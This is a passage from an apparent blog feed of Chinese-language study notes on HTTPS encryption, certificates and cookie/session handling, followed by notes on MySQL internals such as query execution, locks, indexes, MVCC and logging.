title="混合加密"></a>混合加密</h3><p>通过<strong>混合加密</strong>的方式可以保证信息的<strong>机密性</strong>，解决了窃听的风险。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657506133791-a190fe08-e2c0-45fe-8e07-1b921ed067b6.png"><br>HTTPS 采用的是<strong>对称加密</strong>和<strong>非对称加密</strong>结合的「混合加密」方式：</p></li><li><p>在通信建立前采用<strong>非对称加密</strong>的方式交换「会话秘钥」，后续就不再使用非对称加密。</p></li><li><p>在通信过程中全部使用<strong>对称加密</strong>的「会话秘钥」的方式加密明文数据。</p></li></ul><p>采用「混合加密」的方式的原因：</p><ul><li><strong>对称加密</strong>只使用一个密钥，运算速度快，密钥必须保密，无法做到安全的密钥交换。</li><li><strong>非对称加密</strong>使用两个密钥：公钥和私钥，公钥可以任意分发而私钥保密，解决了密钥交换问题但速度慢。<h3 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h3>那么，在计算机里会<strong>用摘要算法（哈希函数）来计算出内容的哈希值</strong>，也就是内容的「指纹」，这个<strong>哈希值是唯一的，且无法通过哈希值推导出内容</strong>。</li></ul><p>通过哈希算法可以确保内容不会被篡改，<strong>但是并不能保证「内容 + 哈希值」不会被中间人替换，因为这里缺少对客户端收到的消息是否来源于服务端的证明</strong>。</p><ul><li><strong>公钥加密，私钥解密</strong>。这个目的是为了<strong>保证内容传输的安全</strong>，因为被公钥加密的内容，其他人是无法解密的，只有持有私钥的人，才能解密出实际的内容；</li><li><strong>私钥加密，公钥解密</strong>。这个目的是为了<strong>保证消息不会被冒充</strong>，因为私钥是不可泄露的，如果公钥能正常解密出私钥加密的内容，就能证明这个消息是来源于持有私钥身份的人发送的。<h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3>在计算机里，这个权威的机构就是 CA （数字证书认证机构），将服务器公钥放在数字证书（由数字证书认证机构颁发）中，只要证书是可信的，公钥就是可信的。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657506280631-2233b593-67d1-48c4-9248-8341b45137e7.png"></li></ul><h1 id="Cookie与Session的对比"><a href="#Cookie与Session的对比" class="headerlink" title="Cookie与Session的对比"></a>Cookie与Session的对比</h1><p>HTTP作为无状态协议，必然需要在某种方式保持连接状态。这里简要介绍一下Cookie和Session。<br><strong>Cookie</strong></p><ul><li>Cookie是客户端保持状态的方法。Cookie简单的理解就是存储由服务器发至客户端并由客户端保存的一段字符串。为了保持会话，服务器可以在响应客户端请求时将Cookie字符串放在Set-Cookie下，客户机收到Cookie之后保存这段字符串，之后再请求时候带上Cookie就可以被识别。除了上面提到的这些，Cookie在客户端的保存形式可以有两种，一种是会话Cookie一种是持久Cookie，会话Cookie就是将服务器返回的Cookie字符串保持在内存中，关闭浏览器之后自动销毁，持久Cookie则是存储在客户端磁盘上，其有效时间在服务器响应头中被指定，在有效期内，客户端再次请求服务器时都可以直接从本地取出。需要说明的是，存储在磁盘中的Cookie是可以被多个浏览器代理所共享的。</li></ul><p><strong>Session</strong></p><ul><li>Session是服务器保持状态的方法。首先需要明确的是，Session保存在服务器上，可以保存在数据库、文件或内存中，每个用户有独立的Session用户在客户端上记录用户的操作。我们可以理解为每个用户有一个独一无二的Session ID作为Session文件的Hash键，通过这个值可以锁定具体的Session结构的数据，这个Session结构中存储了用户操作行为。</li></ul><p>当服务器需要识别客户端时就需要结合Cookie了。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用Cookie来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在Cookie里面记录一个Session ID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。如果客户端的浏览器禁用了Cookie，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如sid=xxxxx这样的参数，服务端据此来识别用户，这样就可以帮用户完成诸如用户名等信息自动填入的操作了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;TCP连接、Http/Https、Cookie/Session&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="https://winkygranger.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="计算机网络" scheme="https://winkygranger.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>MySQL</title>
    <link href="https://winkygranger.github.io/2022/05/20/Mysql/"/>
    <id>https://winkygranger.github.io/2022/05/20/Mysql/</id>
    <published>2022-05-20T13:03:41.000Z</published>
    <updated>2023-01-21T09:00:51.356Z</updated>
    
    <content type="html"><![CDATA[<p>Mysql索引、Mysql优化、日志</p><span id="more"></span><h1 id="执行一条-select-语句，期间发生了什么？"><a href="#执行一条-select-语句，期间发生了什么？" class="headerlink" title="执行一条 select 语句，期间发生了什么？"></a>执行一条 select 语句，期间发生了什么？</h1><h2 id="第一步：连接器"><a href="#第一步：连接器" class="headerlink" title="第一步：连接器"></a>第一步：连接器</h2><p>连接的过程需要先经过 TCP 三次握手，因为 MySQL 是基于 TCP 协议进行传输的</p><h2 id="第二步：查询缓存"><a href="#第二步：查询缓存" class="headerlink" title="第二步：查询缓存"></a>第二步：查询缓存</h2><p>对于更新比较频繁的表，查询缓存的命中率很低的，因为只要一个表有更新操作，那么这个表的查询缓存就会被清空。如果刚缓存了一个查询结果很大的数据，还没被使用的时候，刚好这个表有更新操作，查询缓冲就被清空了，相当于缓存了个寂寞。<br>所以，MySQL 8.0 版本直接将查询缓存删掉了，也就是说 MySQL 8.0 开始，执行一条 SQL 查询语句，不会再走到查询缓存这个阶段了。<br>对于 MySQL 8.0 之前的版本，如果想关闭查询缓存，我们可以通过将参数 query_cache_type 设置成 DEMAND</p><h2 id="第三步：解析-SQL"><a href="#第三步：解析-SQL" class="headerlink" title="第三步：解析 SQL"></a>第三步：解析 SQL</h2><h3 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h3><p>第一件事情，<strong>词法分析</strong>。MySQL 会根据你输入的字符串识别出关键字出来，构建出 SQL 语法树，这样方面后面模块获取 SQL 类型、表名、字段名、 where 条件等等。<br>第二件事情，<strong>语法分析</strong>。根据词法分析的结果，语法解析器会根据语法规则，判断你输入的这个 SQL 语句是否满足 MySQL 语法。</p><h2 id="第四步：执行-SQL"><a href="#第四步：执行-SQL" class="headerlink" title="第四步：执行 SQL"></a>第四步：执行 SQL</h2><h3 id="预处理器"><a href="#预处理器" class="headerlink" title="预处理器"></a>预处理器</h3><p>我们先来说说预处理阶段做了什么事情。</p><ul><li>检查 SQL 查询语句中的表或者字段是否存在；</li><li>将 select * 中的 * 符号，扩展为表上的所有列<h3 id="优化器"><a href="#优化器" class="headerlink" title="优化器"></a>优化器</h3>经过预处理阶段后，还需要为 SQL 查询语句先制定一个执行计划，这个工作交由「优化器」来完成的。</li></ul><p><strong>优化器主要负责将 SQL 查询语句的执行方案确定下来</strong>，比如在表里面有多个索引的时候，优化器会基于查询成本的考虑，来决定选择使用哪个索引。</p><ul><li><p>逻辑优化查询：怎么查询效率更高</p></li><li><p>物理优化查询：索引等</p><h3 id="执行器"><a href="#执行器" class="headerlink" title="执行器"></a>执行器</h3><p>经历完优化器后，就确定了执行方案，接下来 MySQL 就真正开始执行语句了，这个工作是由「执行器」完成的。在执行的过程中，执行器就会和存储引擎交互了，交互是以记录为单位的。<br>接下来，用三种方式执行过程，跟大家说一下执行器和存储引擎的交互过程（PS ：为了写好这一部分，特地去看 MySQL 源码，也是第一次看哈哈）。</p></li><li><p>主键索引查询</p></li><li><p>全表扫描</p></li><li><p>索引下推</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>执行一条 SQL 查询语句，期间发生了什么？</p></li><li><p>连接器：建立连接，管理连接、校验用户身份；</p></li><li><p>查询缓存：查询语句如果命中查询缓存则直接返回，否则继续往下执行。MySQL 8.0 已删除该模块；</p></li><li><p>解析 SQL，通过解析器对 SQL 查询语句进行词法分析、语法分析，然后构建语法树，方便后续模块读取表名、字段、语句类型；</p></li><li><p>执行 SQL：执行 SQL 共有三个阶段：</p><ul><li>预处理阶段：检查表或字段是否存在；将 select * 中的 * 符号扩展为表上的所有列。</li><li>优化阶段：基于查询成本的考虑， 选择查询成本最小的执行计划；</li><li>执行阶段：根据执行计划执行 SQL 查询语句，从存储引擎读取记录，返回给客户端；</li></ul></li></ul><p><img src="/2022/05/20/Mysql/1657333914716-af5bc129-39a9-4b31-8c80-e0ee9d39f500.png"></p><h1 id="Mysql-explain-执行计划"><a href="#Mysql-explain-执行计划" class="headerlink" title="Mysql explain 执行计划"></a>Mysql explain 执行计划</h1><p><img src="/2022/05/20/Mysql/1658305376551-ad5553c7-9e4e-4e53-9ec2-c0f9739a1783.png"><br><img src="/2022/05/20/Mysql/1658305387675-47f134db-f45f-4722-b9a0-1a88d5de0cf6.png"></p><h1 id="事务的四大特性？"><a href="#事务的四大特性？" class="headerlink" title="事务的四大特性？"></a>事务的四大特性？</h1><p><strong>事务特性ACID</strong>：<strong>原子性</strong>（<code>Atomicity</code>）、<strong>一致性</strong>（<code>Consistency</code>）、<strong>隔离性</strong>（<code>Isolation</code>）、<strong>持久性</strong>（<code>Durability</code>）。</p><ul><li><strong>原子性</strong>是指事务包含的所有操作要么全部成功，要么全部失败回滚。</li><li><strong>一致性</strong>是指一个事务执行之前和执行之后都必须处于一致性状态。比如a与b账户共有1000块，两人之间转账之后无论成功还是失败，它们的账户总和还是1000。</li><li><strong>隔离性</strong>。跟隔离级别相关，如<code>read committed</code>，一个事务只能读到已经提交的修改。</li><li><strong>持久性</strong>是指一个事务一旦被提交了，那么对数据库中的数据的改变就是永久性的，即便是在数据库系统遇到故障的情况下也不会丢失提交事务的操作。<h1 id="数据库范式"><a href="#数据库范式" class="headerlink" title="数据库范式"></a>数据库范式</h1></li></ul><p><strong>一范式、二范式、三范式、巴斯-科德范式、第四范式、第五范式（完美范式）</strong><br><strong>「第一范式」</strong>：数据库中的字段具有<strong>「原子性」</strong>，不可再分，并且是单一职责</p><table><thead><tr><th><strong>国家</strong></th><th><strong>省</strong></th><th><strong>市</strong></th><th><strong>区</strong></th><th><strong>街道</strong></th></tr></thead><tbody><tr><td>中国</td><td>上海</td><td>上海</td><td>宝山区</td><td>上大路99号</td></tr></tbody></table><p><strong>「第二范式」</strong>：<strong>「建立在第一范式的基础上」</strong>，第二范式要求数据库表中的每个实例或行必须<strong>「可以被唯一地区分」</strong>。为实现区分通常需要为表加上一个列，以存储各个实例的惟一标识。这个惟一属性列被称为主键。（任何字段只能依赖主键）</p><table><thead><tr><th><strong>订单编号</strong></th><th><strong>商品编号</strong></th><th><strong>用户ID</strong></th><th><strong>下单时间</strong></th><th><strong>商品名称</strong></th></tr></thead><tbody><tr><td>4654641666</td><td>4553</td><td>2424</td><td>2022-07-04</td><td>洗衣机</td></tr></tbody></table><p>很显然，商品名称和订单无关，商品名称是依赖商品编号的，这是<strong>部分依赖</strong>！不应该放在同一张表格里面，应该拆成订单表和商品表。<br><strong>「第三范式」</strong>：<strong>「建立在第一，第二范式的基础上」</strong>，确保每列都和主键列直接相关，而不是间接相关不存在其他表的非主键信息<br>其中总价是通过前面两个字段计算得到，数据库不要有数学计算的操作，业务需要的时候通过代码进行计算，不要入库</p><table><thead><tr><th><strong>商品</strong></th><th><strong>单价</strong></th><th><strong>数量</strong></th><th><strong>总价</strong></th></tr></thead><tbody><tr><td>12456</td><td>10</td><td>50</td><td>500</td></tr></tbody></table><p>但是在我们的日常开发当中，<strong>「并不是所有的表一定要满足三大范式」</strong>，有时候冗余几个字段可以少关联几张表，带来的查询效率的提升有可能是质变的</p><h1 id="Order-By-为什么会导致索引失效"><a href="#Order-By-为什么会导致索引失效" class="headerlink" title="Order By 为什么会导致索引失效"></a>Order By 为什么会导致索引失效</h1><ul><li><p>字段： a\b\c\d,索引：b\c\d</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t1 <span class="keyword">ORDER</span> <span class="keyword">BY</span> b,c,d;</span><br></pre></td></tr></table></figure><ul><li>走bcd，不需要排序，n次回表</li><li>全表扫描，内存里排库 + 不用回表<h1 id="MySQL锁的类型"><a href="#MySQL锁的类型" class="headerlink" title="MySQL锁的类型"></a>MySQL锁的类型</h1></li></ul></li><li><p>基于锁的分类：共享锁、排他锁</p></li><li><p>基于锁的粒度：行级锁、表级锁、页级锁、记录锁、间隙锁、临键锁</p></li><li><p>基于锁的状态：意向共享锁、意向排他锁</p><h2 id="表级锁具体内容"><a href="#表级锁具体内容" class="headerlink" title="表级锁具体内容"></a>表级锁具体内容</h2></li><li><p>表锁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lock tables 表名…… read<span class="operator">/</span>write</span><br><span class="line"></span><br><span class="line">lock tables </span><br></pre></td></tr></table></figure><ul><li>表共享读锁</li><li>表独占写锁</li><li><img src="/2022/05/20/Mysql/1657333063981-ebe95b29-107d-44e3-a5cc-11068f72dcba.png"></li></ul></li><li><p>元数据锁（共享锁）：在select和update时候都会自动加上</p><ul><li>系统自动，无需显示使用，访问一张表会自动加上。当这张表上有未提交的事物，就不能修改表结构，被阻塞</li><li><img src="/2022/05/20/Mysql/1657333113221-e980c641-94a1-41cb-afc3-8d561267e904.png"></li></ul></li><li><p>意向锁</p><ul><li>一个线程A给一行加了锁。另一个线程B想给整张表加锁，此时会有问题，B就要一帮一行找A给哪一行加了锁，很麻烦。</li><li>修改：在A给表加行锁的时候还会有一把意向锁，B要给表上锁的时候就会和意向锁进行兼容，兼容就说明可以给表上锁，否则不行，会处于阻塞状态，直到A行锁释放意向锁释放，B给表上锁</li><li>意向锁分为两种：意向共享锁和意向排他锁<ul><li>意向共享锁：与表锁共享锁兼容，与表锁排他锁互斥</li><li>意向排他锁：与表锁共享锁、表锁排他锁互斥<h2 id="行级锁具体内容"><a href="#行级锁具体内容" class="headerlink" title="行级锁具体内容"></a>行级锁具体内容</h2></li></ul></li></ul></li><li><p>行锁</p><ul><li>共享锁：</li><li>排他锁：</li><li><img src="/2022/05/20/Mysql/1657333133166-f8db6502-9f48-45ea-920c-c05a2a3b96dd.png"></li></ul></li><li><p>间隙锁（一个范围，不包含该记录），确保索引间隙不变，防止其他事务在这个间隙进行insert导致幻读</p></li><li><p>临键锁：行锁+间隙锁，同时锁住数据和间隙</p><h1 id="MySQL数据库中什么情况下索引无法使用"><a href="#MySQL数据库中什么情况下索引无法使用" class="headerlink" title="MySQL数据库中什么情况下索引无法使用"></a>MySQL数据库中什么情况下索引无法使用</h1></li><li><p>不符合最左匹配原则</p></li><li><p>字段进行了隐私数据类型转化</p></li><li><p>走索引没有全表扫描效率高</p><h1 id="为什么B-树比B树更适合实现数据库索引？"><a href="#为什么B-树比B树更适合实现数据库索引？" class="headerlink" title="为什么B+树比B树更适合实现数据库索引？"></a>为什么B+树比B树更适合实现数据库索引？</h1></li><li><p>由于B+树的数据都存储在叶子结点中，叶子结点均为索引，方便扫库，只需要扫一遍叶子结点即可，但是B树因为其分支结点同样存储着数据，我们要找到具体的数据，需要进行一次中序遍历按序来扫，所以B+树更加适合在区间查询的情况，而在数据库中基于范围的查询是非常频繁的，所以通常B+树用于数据库索引。</p></li><li><p>B+树的节点只存储索引key值，具体信息的地址存在于叶子节点的地址中。这就使以页为单位的索引中可以存放更多的节点。减少更多的I/O支出。</p></li><li><p>B+树的查询效率更加稳定，任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当。</p><h1 id="MyISAM和InnoDB"><a href="#MyISAM和InnoDB" class="headerlink" title="MyISAM和InnoDB"></a>MyISAM和InnoDB</h1><table><thead><tr><th><strong>myISAM</strong></th><th><strong>InnoDB</strong></th></tr></thead><tbody><tr><td>不支持事务，每次查询都是原子的</td><td>ACID，事务，支持四种隔离级别</td></tr><tr><td>表锁</td><td>行锁，支持并发写</td></tr><tr><td>无MVCC</td><td>MVCC</td></tr><tr><td>三个文件：索引文件、表结构文件、数据文件</td><td>除了主键以外，其他索引只存储索引内容</td></tr><tr><td>存储了表的总行数</td><td>没有存表行数</td></tr><tr><td>索引数据分开</td><td>主键索引文件存了所有的数据</td></tr></tbody></table></li></ul><p>注意：MyISAM引擎的主键索引，B+数的叶子节点存储的是主键和</p><h1 id="什么是MVCC"><a href="#什么是MVCC" class="headerlink" title="什么是MVCC"></a>什么是MVCC</h1><ul><li><p>MVCC 多版本并发控制，读取的时候通过快照的方式将数据存下来，这样读锁写锁不冲突，不同事物session会看到自己的版本链</p></li><li><p>MVCC只在已提交读和可重复读两个隔离级别下工作</p></li><li><p>InnoDB在每行数据都增加三个隐藏字段，一个唯一行号，一个记录创建的版本号，一个记录回滚的版本号。</p></li><li><p>聚簇索引记录中有3个隐藏列 trx_id 和roll_pointer和ROW_ID</p><ul><li>trx_id：用来存储每一次对某条聚簇索引记录修改时的事务id</li><li>roll_pointer：修改时，将老版本写入undo log中，roll_pointer存了一个指针，指向上一个版本记录的位置，通过它来获得上一条记录的信息</li><li>ROW_ID：隐藏主键，如果表结构没有指定主键，将会生成隐藏字段</li></ul></li><li><p>已提交读和可重复读的区别在于他们生成的ReadView策略不同</p><ul><li>开始事务时创建ReadView，维护事务的id（即未提交的事务），排成一个数组</li><li><img src="/2022/05/20/Mysql/1657333223780-4c02d9c3-5164-4eee-a728-213900de5c01.png"><ul><li>已提交读：事务每次查询开始都声称一个独立的ReadView</li><li>可重复读：第一次读的时候生成一个ReadView，之后复用之前的ReadView</li></ul></li></ul></li><li><p>通过版本链实现并发读写。通过ReadView生成策略的不同实现不同的隔离级别</p><h1 id="什么是脏读、幻读、不可重复读"><a href="#什么是脏读、幻读、不可重复读" class="headerlink" title="什么是脏读、幻读、不可重复读"></a>什么是脏读、幻读、不可重复读</h1></li><li><p>脏读：一个事务修改了一个值，但是需要回滚 回滚前另一个事务读到了被修改后的值</p></li><li><p>幻读：一个事务插入了一条数据。插入前后另一个事务分别读取，读取的记录数不一样</p></li><li><p>不可重复读：一个事务修改前后，另一个事务读到的数据不一致</p><h1 id="事务的基本特性和隔离级别"><a href="#事务的基本特性和隔离级别" class="headerlink" title="事务的基本特性和隔离级别"></a>事务的基本特性和隔离级别</h1></li><li><p>ACID</p><ul><li>原子性：全执行/不执行</li><li>一致性：</li><li>隔离性：事务事物之间互不干扰</li><li>持久性：写在磁盘</li></ul></li><li><p>隔离级别</p><ul><li>读未提交：脏读 幻读 不可重复读</li><li>读已提交：幻读 不可重复读</li><li>可重复读：幻读(可通过临键锁解决)</li><li>串行化：（大量的锁 容易导致死锁）<h1 id="事务的实现原理"><a href="#事务的实现原理" class="headerlink" title="事务的实现原理"></a>事务的实现原理</h1>事务是基于重做日志文件(redo log)和回滚日志(undo log)实现的。<br>每提交一个事务必须先将该事务的所有日志写入到重做日志文件进行持久化，数据库就可以通过重做日志来保证事务的原子性和持久性。<br>每当有修改事务时，还会产生undo log，如果需要回滚，则根据undo log 的反向语句进行逻辑操作，比如insert一条记录就delete一条记录。undo log主要实现数据库的一致性。</li></ul></li></ul><h1 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h1><ul><li>功能逻辑上：普通索引、唯一索引、全文索引、单列索引</li><li>物理实现：聚簇索引、非聚簇索引</li><li>作用字段个数：单列索引、联合索引</li></ul><p><strong>普通索引：</strong>可以在任何数据类型<br><strong>唯一索引：</strong>该值必须唯一，允许有空值，比如邮箱、身份证、手机号<br><strong>主键索引：</strong>聚簇索引、非聚簇索引<br><strong>单列索引：</strong>一个字段<br><strong>联合索引：</strong>idx_id_name_gender 多个字段，使用要遵守<strong>最左前缀原则</strong></p><h1 id="什么是索引覆盖"><a href="#什么是索引覆盖" class="headerlink" title="什么是索引覆盖"></a>什么是索引覆盖</h1><p>SQL执行的时候可以利用索引快速查找。字段在索引中都包含了，不需要回表，所有数据都在叶子节点上.</p><ul><li>理解方式1：索引是高校找到行的一个方法，但是一般数据库也能使用索引找到一个列的数据，因此他不必读取整个行，毕竟索引叶子节点储存了他们的索引数据，当能通过读取索引就可以得到想要的数据，那就不需要读取行了，<strong>一个索引包含了满足查询结果的所有数据就叫组覆盖索引</strong></li><li>理解方式2：非聚簇复合索引的一种形式，它包括在查询里的SELECT、JOIN、WHERE子句中做到所有列（即建索引的字段正好是覆盖查询条件中所涉及的字段）</li></ul><p>简单地说就是：索引列+主键 包含SELECT到FROM之间的查询列</p><h1 id="聚集索引、非聚集索引"><a href="#聚集索引、非聚集索引" class="headerlink" title="聚集索引、非聚集索引"></a>聚集索引、非聚集索引</h1><ul><li><p>InnoDB中，主键索引和每一条数据都放在同一个文件中。聚集索引的叶子节点包含了完整的数据记录</p></li><li><p>MyISAM的索引和主键分别放在myi和myd中，每次查询的时候从myi查到数据的存放位置，然后去myd中查出来，类似于一种回表的操作</p><h2 id="聚簇索引和二级索引"><a href="#聚簇索引和二级索引" class="headerlink" title="聚簇索引和二级索引"></a>聚簇索引和二级索引</h2><p>另外，索引又可以分成聚簇索引和非聚簇索引（二级索引），它们区别就在于叶子节点存放的是什么数据：</p></li><li><p>聚簇索引的叶子节点存放的是实际数据，所有完整的用户记录都存放在聚簇索引的叶子节点；</p></li><li><p>二级索引的叶子节点存放的是主键值，而不是实际数据。</p></li></ul><p>因为表的数据都是存放在聚簇索引的叶子节点里，所以 InnoDB 存储引擎一定会为表创建一个聚簇索引，且由于数据在物理上只会保存一份，所以聚簇索引只能有一个。<br>InnoDB 在创建聚簇索引时，会根据不同的场景选择不同的列作为索引：</p><ul><li>如果有主键，默认会使用主键作为聚簇索引的索引键；</li><li>如果没有主键，就选择第一个不包含 NULL 值的唯一列作为聚簇索引的索引键；</li><li>在上面两个都没有的情况下，InnoDB 将自动生成一个隐式自增 id 列作为聚簇索引的索引键；</li></ul><p>一张表只能有一个聚簇索引，那为了实现非主键字段的快速搜索，就引出了二级索引（非聚簇索引/辅助索引），它也是利用了 B+ 树的数据结构，但是二级索引的叶子节点存放的是主键值，不是实际数据。<br>二级索引的 B+ 树如下图，数据部分为主键值：<br><img src="/2022/05/20/Mysql/1657334316183-212c9bda-c218-41a8-972d-ca65855f7155.png"><br>因此，<strong>如果某个查询语句使用了二级索引，但是查询的数据不是主键值，这时在二级索引找到主键值后，需要去聚簇索引中获得数据行，这个过程就叫作「回表」，也就是说要查两个 B+ 树才能查到数据。不过，当查询的数据是主键值时，因为只在二级索引就能查询到，不用再去聚簇索引查，这个过程就叫作「索引覆盖」，也就是只需要查一个 B+ 树就能找到数据。</strong></p><h1 id="MySQL三大日志-binlog、redo-log和undo-log-详解"><a href="#MySQL三大日志-binlog、redo-log和undo-log-详解" class="headerlink" title="MySQL三大日志(binlog、redo log和undo log)详解"></a>MySQL三大日志(binlog、redo log和undo log)详解</h1><p><img src="/2022/05/20/Mysql/1657333329885-3b7fdef7-9a04-4283-a545-d62272fa75c7.png"></p><ul><li>redo log:（重做日志）是InnoDB存储引擎独有的，它让MySQL拥有了崩溃恢复能力。<ul><li>比如 MySQL 实例挂了或宕机了，重启时，InnoDB存储引擎会使用redo log恢复数据，保证数据的持久性与完整性。</li><li>MySQL 中数据是以页为单位，你查询一条记录，会从硬盘把一页的数据加载出来，加载出来的数据叫数据页，会放入到 Buffer Pool 中。</li><li>后续的查询都是先从 Buffer Pool 中找，没有命中再去硬盘加载，减少硬盘 IO 开销，提升性能。</li><li>更新表数据的时候，也是如此，发现 Buffer Pool 里存在要更新的数据，就直接在 Buffer Pool 里更新。</li><li><strong>然后会把“在某个数据页上做了什么修改，比如页号xxx,偏移量yyy，写入了zzz数据”记录到重做日志缓存（redo log buffer）里，接着刷盘到 redo log 文件里。</strong>（物理级别的修改）</li></ul></li><li>binlog<ul><li>redo log 它是物理日志，记录内容是“在某个数据页上做了什么修改”，属于 InnoDB 存储引擎。</li><li>而 binlog 是逻辑日志，记录内容是语句的原始逻辑，类似于“给 ID=2 这一行的 c 字段加 1”，属于MySQL Server 层。</li><li>在事务执行的过程中，redo log会不断顺序记录，直到这个给事务提交，才会一次性写到bin log 中。</li></ul></li><li>undo log<ul><li>我们知道如果想要保证事务的原子性，就需要在异常发生时，对已经执行的操作进行<strong>回滚</strong>，在 MySQL 中，恢复机制是通过 <strong>回滚日志（undo log）</strong> 实现的，所有事务进行的修改都会先记录到这个回滚日志中，然后再执行相关的操作。如果执行过程中遇到异常的话，我们直接利用 <strong>回滚日志</strong> 中的信息将数据回滚到修改之前的样子即可！并且，回滚日志会先于数据持久化到磁盘上。这样就保证了即使遇到数据库突然宕机等情况，当用户再次启动数据库的时候，数据库还能够通过查询回滚日志来回滚将之前未完成的事务。</li><li>另外，MVCC 的实现依赖于：<strong>隐藏字段、Read View、undo log</strong>。在内部实现中，InnoDB 通过数据行的 DB_TRX_ID 和 Read View 来判断数据的可见性，如不可见，则通过数据行的 DB_ROLL_PTR 找到 undo log 中的历史版本。每个事务读到的数据版本可能是不一样的，在同一个事务中，用户只能看到该事务创建 Read View 之前已经提交的修改和该事务本身做的修改</li></ul></li><li>MySQL InnoDB 引擎使用 <strong>redo log(重做日志)</strong> 保证事务的<strong>持久性</strong>，使用 <strong>undo log(回滚日志)</strong> 来保证事务的<strong>原子性</strong>。<h1 id="Mysql主从复制"><a href="#Mysql主从复制" class="headerlink" title="Mysql主从复制"></a>Mysql主从复制</h1></li></ul><p><strong>(1)</strong> 为什么要做主从复制？<br>1、在业务复杂的系统中，有这么一个情景，有一句sql语句需要锁表，导致暂时不能使用读的服务，那么就很影响运行中的业务，使用主从复制，让主库负责写，从库负责读，这样，即使主库出现了锁表的情景，通过读从库也可以保证业务的正常运作。<br>2、做数据的热备<br>3、架构的扩展。业务量越来越大，I/O访问频率过高，单机无法满足，此时做多库的存储，降低磁盘I/O访问的频率，提高单个机器的I/O性能。<br><strong>(2)</strong> 什么是mysql的主从复制<br>MySQL 主从复制是指数据可以从一个MySQL数据库服务器主节点复制到一个或多个从节点。MySQL 默认采用<strong>异步</strong>复制方式，这样从节点不用一直访问主服务器来更新自己的数据，数据的更新可以在远程连接上进行，从节点可以复制主数据库中的所有数据库或者特定的数据库，或者特定的表。<br><strong>(3)</strong> 主从复制原理</p><ol><li>master服务器将数据的改变记录在二进制binlog日志上，当master上的数据发生改变时，将其写入二进制文件中;</li><li>slave服务器会在一定时间间隔内对master二进制日志进行探测是否发生改变，如果发生改变，则开始一个I/O Thread请求master二进制事件</li><li>同时主节点为每个I/O线程启动一个dump线程，用于向其发送二进制时间，并保存至 从节点 本地的中继日志中，从节点 将启动sql线程从中继日志中读取二进制日志，在本地释放，使得其数据和主节点的保持一致，最后I/OThread和SQLThread将进入睡眠状态，等待下一次被唤醒。</li></ol><p>简单说：</p><ul><li><p>从库会生成两个线程,一个I/O线程,一个SQL线程;</p></li><li><p>主库会生成一个log dump线程,用来给从库I/O线程传binlog;</p></li><li><p>I/O线程会去请求主库的binlog,并将得到的binlog写到本地的relay-log(中继日志)文件中;</p></li><li><p>SQL线程,会读取relay log文件中的日志,并解析成sql语句逐一执行。</p><h1 id="Innodb如何实现事务（update语句为例）"><a href="#Innodb如何实现事务（update语句为例）" class="headerlink" title="Innodb如何实现事务（update语句为例）"></a>Innodb如何实现事务（update语句为例）</h1></li><li><p>Buffer Pool: update语句—&gt; 找到数据所在页-&gt; 缓存在Buffer Pool中</p></li><li><p>执行update语句 修改Buffer pool中的数据</p></li><li><p>针对update语句生成redolog对象，存入logBuffer中</p></li><li><p>针对update语句生成undo日志作为回滚使用</p></li><li><p>如果事务提交，Redolog持久化，后续有机制将BufferPool 中所修改的数据页持久化到磁盘中</p></li><li><p>如果事务回滚，则用undo日志进行回滚</p></li><li><p><img src="/2022/05/20/Mysql/1659944815452-bf46871a-de0e-4118-b912-69b3a44f67c7.png"></p><h1 id="Innodb-事务为什么要两阶段提交"><a href="#Innodb-事务为什么要两阶段提交" class="headerlink" title="Innodb 事务为什么要两阶段提交?"></a>Innodb 事务为什么要两阶段提交?</h1></li><li><p>两段式提交，就是我们先把这次更新写入到redolog中，并设redolog为prepare状态，然后再写入binlog,写完binlog之后再提交事务，并设redolog为commit状态。也就是把redolog拆成了prepare和commit两段！</p></li><li><p>其实redolog是后来才加上的，binlog是之前就有的。一开始存储引擎只有MyISAM,后来才有的InnoDB,然后MyISAM没有事务，没有crash-safe的能力。所以InnoDB搞了个redolog。然后<strong>为了保证两份日志同步，所以才有了两段式提交</strong>。</p></li><li><p>你假设一下如果先保存好redolog,然后再记录binlog。如果redolog写好了之后挂了。ok你看起来好像是没问题了，但是你的binlog还没记录，所以这条记录就少了！如果你备份这份binlog之后，你这条记录就永远的少了！</p></li><li><p>那如果先写binlog再写redolog呢？那binlog写完了，你数据库挂了，那redolog是不是没有，没有的意思就是你以前你没更新成功。但是binlog已经记录好了，在它那边反正是成功了，所以那备份的binlog也不对！</p><h1 id="WAl-是什么-有什么好处"><a href="#WAl-是什么-有什么好处" class="headerlink" title="WAl 是什么?有什么好处?"></a>WAl 是什么?有什么好处?</h1><p>WAI主要先写日志、再写磁盘</p></li></ul><p><strong>WAL(Write Ahead Log)预写日志，是数据库系统中常见的一种手段，用于：</strong><br>1、保证数据操作的原子性和持久性。<br>2、使得随机写变为顺序写提高性能。<br><strong>WAL 